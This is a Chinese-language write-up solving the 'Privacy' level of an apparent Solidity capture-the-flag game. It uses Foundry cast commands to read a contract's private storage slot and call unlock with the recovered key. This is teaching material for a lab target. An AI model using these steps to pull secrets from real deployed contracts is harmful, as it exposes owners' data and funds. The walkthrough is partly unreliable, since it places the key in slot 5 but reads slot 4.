### 第12关：Privacy 

这一关和第8关 Vault 有点类似，目的是要读取合约中的 bytes32[3] private data 变量。从代码布局
```solidity
contract Privacy {
    // 1 byte, slot 0
    bool public locked = true;
    // 32 bytes, slot 1
    uint256 public ID = block.timestamp;
    // 1 byte, slot 2
    uint8 private flattening = 10;
    // 1 byte, slot 2
    uint8 private denomination = 255;
    // 2 byte, slot 2
    uint16 private awkwardness = uint16(block.timestamp);
    // bytes32[0], 32 bytes, slot 3
    // bytes32[1], 32 bytes, slot 4
    // bytes32[2], 32 bytes, slot 5
    bytes32[3] private data;
}
```
如果你对变量的存储布局比较了解，可以推算一下 data 的 slot 位置，或者获取多一些比如 slot0~slot9 来观察一下。
可以推测出 password 存放在 slot5 中。



**使用 foundry cast 来读取存储槽4, 得到密码：**
```shell
cast storage 0x目标合约地址 4  --rpc-url=https://blastapi.io
 ```
 显示为 0xaa123456789012345678901234567890123456789012345678901234567890ff
这里涉及到一个数据类型的转换: 
```solidity
require(_key == bytes16(data[2]));
```
data[2] 是一个 bytes32 类型，转换为 bytes16 的话，会截断超出长度的部分，数据只保留高16位：0xaa123456789012345678901234567890，这个就是我们要找的答案了。

然后调用 unlock(bytes16 _key) 函数：
 ```shell
cast send 0x目标合约地址 "unlock(bytes16 _key)" 0xaa123456789012345678901234567890  --rpc-url=https://public.blastapi.io  --private-key=攻击者私钥
 ```

 点击 Submit Instance, 过关。
